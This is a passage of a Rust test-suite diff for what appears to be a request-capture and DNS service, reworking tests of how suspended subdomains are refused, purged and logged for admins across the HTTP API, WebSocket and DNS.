+        let other_token = generate_jwt(&other).unwrap();
         assert_eq!(
-            api(&server, &bearer, "GET", "/api/v2/files", "")
+            server
+                .api(&other_token, "GET", "/api/v2/files", "")
                 .await
                 .status,
+            200
+        );
+
+        // The same token works again once lifted
+        server
+            .admin("DELETE", &format!("{ADMIN_API}/{label}"), "")
+            .await;
+        assert_eq!(
+            server.api(&token, "GET", "/api/v2/files", "").await.status,
             200
         );
     }
 
     #[tokio::test]
-    async fn captured_requests_stay_readable_by_the_admin_until_purged() {
-        let server = TestServer::start(true, Some(ADMIN)).await;
+    async fn a_long_poll_stops_when_its_session_is_suspended() {
+        let server = TestServer::start(admin_settings()).await;
         let label = get_random_subdomain();
         let host = server.subdomain_host(&label);
-        let entries = format!("/api/v2/abuse/admin/entries/{label}");
+        let token = generate_jwt(&label).unwrap();
 
-        server.request("GET", &host, "/first", &[], "").await;
-        server.request("GET", &host, "/second", &[], "").await;
-        assert_eq!(server.report(&label).await.status, 201);
-
-        let captured = server.admin("GET", &format!("{entries}/requests")).await;
-        assert_eq!(captured.status, 200);
-        let captured = captured.json();
-        let paths: Vec<&str> = captured["requests"]
-            .as_array()
-            .unwrap()
-            .iter()
-            .map(|request| request["path"].as_str().unwrap())
-            .collect();
-        assert_eq!(paths, ["/first", "/second"]);
-        assert_eq!(captured["pagination"]["total"], 2);
-
-        let purged = server.admin("DELETE", &format!("{entries}/data")).await;
-        assert_eq!(purged.status, 200);
-        assert_eq!(
-            server
-                .cache
-                .llen(&format!("requests:{label}"))
+        let poll = {
+            let authorization = format!("Bearer {token}");
+            let (addr, main_host) = (server.addr, server.main_host());
+            tokio::spawn(async move {
+                http(
+                    addr,
+                    "GET",
+                    &main_host,
+                    "/api/v2/requests?wait=20",
+                    &[("Authorization", authorization.as_str())],
+                    "",
+                )
                 .await
-                .unwrap(),
-            0
-        );
-        let after = server.admin("GET", &format!("{entries}/requests")).await;
-        assert_eq!(after.json()["requests"], json!([]));
+            })
+        };
+        tokio::time::sleep(std::time::Duration::from_millis(300)).await;
+        server.suspend(&label).await;
+        // A victim's request arrives: it must not reach the waiting owner
+        server.request("GET", &host, "/victim", &[], "").await;
 
-        // Purging does not lift the block
-        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 410);
+        let reply = tokio::time::timeout(std::time::Duration::from_secs(5), poll)
+            .await
+            .unwrap()
+            .unwrap();
+        assert_eq!(reply.status, 403, "{}", reply.body);
+        assert!(!reply.body.contains("/victim"));
     }
 
     #[tokio::test]
-    async fn purge_removes_files_and_every_dns_record() {
-        let server = TestServer::start(true, Some(ADMIN)).await;
+    async fn purge_removes_files_dns_records_and_requests() {
+        let server = TestServer::start(admin_settings()).await;
         let label = get_random_subdomain();
         let token = generate_jwt(&label).unwrap();
-        let bearer = format!("Bearer {token}");
 
         let dns = json!({ "records": [
             { "domain": "www", "type": "A", "value": "6.6.6.6" },
-            { "domain": "*", "type": "TXT", "value": "stolen-data" },
+            { "domain": "*", "type": "TXT", "value": "data" },
         ]})
         .to_string();
         assert_eq!(
-            server
-                .request("PUT", &server.main_host(), "/api/v2/dns", JSON, &dns)
-                .await
-                .status,
-            401,
-            "the request needs the owner's token"
+            server.api(&token, "PUT", "/api/v2/dns", &dns).await.status,
+            200
         );
-        server
-            .request(
-                "PUT",
-                &server.main_host(),
-                "/api/v2/dns",
-                &[
-                    ("Authorization", bearer.as_str()),
-                    ("Content-Type", "application/json"),
-                ],
-                &dns,
-            )
-            .await;
         // Fetching the files creates the default file tree, as it does for a new session
+        server.api(&token, "GET", "/api/v2/files", "").await;
         server
-            .request(
-                "GET",
-                &server.main_host(),
-                "/api/v2/files",
-                &[("Authorization", bearer.as_str())],
-                "",
-            )
+            .request("GET", &server.subdomain_host(&label), "/x", &[], "")
             .await;
-        assert!(server
-            .cache
-            .get(&format!("files:{label}"))
-            .await
-            .unwrap()
-            .is_some());
-        assert!(server
-            .cache
-            .get(&format!("dns:A:www.{label}.{}.", CONFIG.server_domain))
-            .await
-            .unwrap()
-            .is_some());
+        server.suspend(&label).await;
 
-        assert_eq!(server.report(&label).await.status, 201);
         let purged = server
-            .admin(
-                "DELETE",
-                &format!("/api/v2/abuse/admin/entries/{label}/data"),
-            )
+            .admin("DELETE", &format!("{ADMIN_API}/{label}/data"), "")
             .await;
         assert_eq!(purged.status, 200);
 
@@ -816,97 +569,44 @@ mod tests {
         ] {
             assert_eq!(server.cache.get(&key).await.unwrap(), None, "{key}");
         }
+        assert_eq!(server.logged(&label).await, 0);
+        // Purging does not lift the suspension
+        assert!(server.abuse.is_blocked(&label));
+    }
+
+    #[tokio::test]
+    async fn admin_traffic_views_are_limited_to_suspended_subdomains() {
+        let server = TestServer::start(admin_settings()).await;
+        let other = get_random_subdomain();
+        for view in ["requests", "sources"] {
+            let reply = server
+                .admin("GET", &format!("{ADMIN_API}/{other}/{view}"), "")
+                .await;
+            assert_eq!(reply.status, 404, "{view}");
+            assert_eq!(reply.code(), "not_suspended");
+        }
     }
 
     #[tokio::test]
     async fn health_reports_the_blocklist() {
-        let server = TestServer::start(true, None).await;
-        let before = server
-            .request("GET", &server.main_host(), "/health", &[], "")
-            .await
-            .json();
-        assert_eq!(before["abuse"]["blocked_subdomains"], 0);
+        let server = TestServer::start(Settings::default()).await;
+        let before = server.main("GET", "/health", &[]).await.json();
+        assert_eq!(before["abuse"]["suspended"], 0);
         assert_eq!(before["abuse"]["persist_failures"], 0);
 
         server.report(&get_random_subdomain()).await;
-        let after = server
-            .request("GET", &server.main_host(), "/health", &[], "")
-            .await
-            .json();
-        assert_eq!(after["abuse"]["blocked_subdomains"], 1);
+        let after = server.main("GET", "/health", &[]).await.json();
+        assert_eq!(after["abuse"]["suspended"], 1);
     }
 
     // --- WebSocket ---------------------------------------------------------
 
-    /// Opens a WebSocket and returns the upgraded stream.
-    async fn websocket(addr: SocketAddr, host: &str) -> TcpStream {
-        let mut stream = TcpStream::connect(addr).await.unwrap();
-        let request = format!(
-            "GET /api/v2/ws HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n\
-             Connection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
-             Sec-WebSocket-Version: 13\r\n\r\n"
-        );
-        stream.write_all(request.as_bytes()).await.unwrap();
-
-        // Read the response head past the upgrade; the socket then carries frames
-        let mut head = Vec::new();
-        let mut byte = [0u8];
-        while !head.ends_with(b"\r\n\r\n") {
-            stream.read_exact(&mut byte).await.unwrap();
-            head.push(byte[0]);
-        }
-        let head = String::from_utf8_lossy(&head).to_string();
-        assert!(head.starts_with("HTTP/1.1 101"), "{head}");
-        stream
-    }
-
-    /// Sends one masked text frame, as a browser would.
-    async fn ws_send(stream: &mut TcpStream, text: &str) {
-        assert!(text.len() <= u16::MAX as usize, "test frames are short");
-        const MASK: [u8; 4] = [0x11, 0x22, 0x33, 0x44];
-        let mut frame = vec![0x81];
-        match text.len() {
-            n if n < 126 => frame.push(0x80 | n as u8),
-            n => {
-                frame.push(0x80 | 126);
-                frame.extend_from_slice(&(n as u16).to_be_bytes());
-            }
-        }
-        frame.extend_from_slice(&MASK);
-        frame.extend(
-            text.bytes()
-                .zip(MASK.iter().cycle())
-                .map(|(byte, mask)| byte ^ mask),
-        );
-        stream.write_all(&frame).await.unwrap();
-    }
-
-    /// Reads one text frame and returns its payload.
-    async fn ws_recv(stream: &mut TcpStream) -> Value {
-        let mut head = [0u8; 2];
-        stream.read_exact(&mut head).await.unwrap();
-        assert_eq!(head[0] & 0x0f, 0x1, "expected a text frame");
-        assert_eq!(head[1] & 0x80, 0, "server frames are not masked");
-        let length = match head[1] & 0x7f {
-            n if n < 126 => n as usize,
-            126 => {
-                let mut extended = [0u8; 2];
-                stream.read_exact(&mut extended).await.unwrap();
-                u16::from_be_bytes(extended) as usize
-            }
-            _ => panic!("test frames are short"),
-        };
-        let mut payload = vec![0u8; length];
-        stream.read_exact(&mut payload).await.unwrap();
-        serde_json::from_slice(&payload).expect("frame is JSON")
-    }
-
     #[tokio::test]
-    async fn websocket_refuses_a_blocked_token_with_its_own_code() {
-        let server = TestServer::start(true, None).await;
+    async fn websocket_refuses_a_suspended_token_with_its_own_code() {
+        let server = TestServer::start(admin_settings()).await;
         let label = get_random_subdomain();
         let other = get_random_subdomain();
-        assert_eq!(server.report(&label).await.status, 201);
+        server.suspend(&label).await;
 
         let mut socket = websocket(server.addr, &server.main_host()).await;
 
@@ -915,12 +615,12 @@ mod tests {
             &json!({ "cmd": "connect", "token": generate_jwt(&label).unwrap() }).to_string(),
         )
         .await;
-        let blocked = ws_recv(&mut socket).await;
-        assert_eq!(blocked["cmd"], "error");
+        let refused = ws_recv(&mut socket).await;
+        assert_eq!(refused["cmd"], "error");
         // Must not be `invalid_token`: the dashboard deletes sessions with an invalid token
-        assert_eq!(blocked["code"], "subdomain_blacklisted");
-        assert_eq!(blocked["subdomain"], label);
-        assert_eq!(blocked["category"], "malware");
+        assert_eq!(refused["code"], "subdomain_suspended");
+        assert_eq!(refused["subdomain"], label.as_str());
+        assert_eq!(refused["category"], "phishing");
 
         ws_send(
             &mut socket,
@@ -939,9 +639,10 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn connected_dashboard_is_told_when_its_session_is_blocked() {
-        let server = TestServer::start(true, None).await;
+    async fn a_connected_dashboard_is_told_and_then_hears_nothing_more() {
+        let server = TestServer::start(Settings::default()).await;
         let label = get_random_subdomain();
+        let host = server.subdomain_host(&label);
 
         let mut socket = websocket(server.addr, &server.main_host()).await;
         ws_send(
@@ -952,12 +653,17 @@ mod tests {
         assert_eq!(ws_recv(&mut socket).await["cmd"], "connected");
 
         assert_eq!(server.report(&label).await.status, 201);
-
         let notice = ws_recv(&mut socket).await;
-        assert_eq!(notice["cmd"], "blacklisted");
-        assert_eq!(notice["subdomain"], label);
-        // The reason travels with the notice, so the dashboard can explain the block at once
+        assert_eq!(notice["cmd"], "suspended");
+        assert_eq!(notice["subdomain"], label.as_str());
         assert_eq!(notice["category"], "malware");
+
+        // Traffic after the suspension is recorded but never pushed to the owner
+        server.request("GET", &host, "/after", &[], "").await;
+        assert_eq!(server.logged(&label).await, 1);
+        ws_send(&mut socket, r#"{"cmd": "ping"}"#).await;
+        let next = ws_recv(&mut socket).await;
+        assert_eq!(next["cmd"], "pong", "got {next} instead");
     }
 
     // --- DNS ---------------------------------------------------------------
@@ -993,10 +699,10 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn dns_treats_a_blocked_subdomain_as_nonexistent() {
+    async fn dns_treats_a_suspended_subdomain_as_nonexistent_but_records_queries() {
         use hickory_proto::op::ResponseCode;
 
-        let server = TestServer::start(true, None).await;
+        let server = TestServer::start(admin_settings()).await;
         let label = get_random_subdomain();
         let name = format!("{}.{}.", label, CONFIG.server_domain);
         let nested = format!("data.{}.", name.trim_end_matches('.'));
@@ -1004,31 +710,26 @@ mod tests {
         assert_eq!(
             dns_query(&server, &name).await,
             (ResponseCode::NoError, 1),
-            "answers with the server address before the block"
+            "answers with the server address before the suspension"
         );
-        let logged_before_block = server
-            .cache
-            .llen(&format!("requests:{label}"))
-            .await
-            .unwrap();
-        assert_eq!(logged_before_block, 1);
+        assert_eq!(server.logged(&label).await, 1);
 
-        assert_eq!(server.report(&label).await.status, 201);
+        server.suspend(&label).await;
 
-        for blocked in [&name, &nested] {
-            let (code, answers) = dns_query(&server, blocked).await;
-            assert_eq!(code, ResponseCode::NXDomain, "{blocked}");
-            assert_eq!(answers, 0, "{blocked}");
+        for suspended in [&name, &nested] {
+            let (code, answers) = dns_query(&server, suspended).await;
+            assert_eq!(code, ResponseCode::NXDomain, "{suspended}");
+            assert_eq!(answers, 0, "{suspended}");
         }
-        // Nothing about the blocked names was logged
-        assert_eq!(
-            server
-                .cache
-                .llen(&format!("requests:{label}"))
-                .await
-                .unwrap(),
-            logged_before_block
-        );
+        // Recorded for the admin, with what was answered
+        assert_eq!(server.logged(&label).await, 3);
+        let captured = server
+            .admin("GET", &format!("{ADMIN_API}/{label}/requests"), "")
+            .await
+            .json();
+        let last = &captured["requests"][2];
+        assert_eq!(last["type"], "dns");
+        assert_eq!(last["reply"], "NXDOMAIN (subdomain suspended)");
 
         let other = get_random_subdomain();
         assert_eq!(
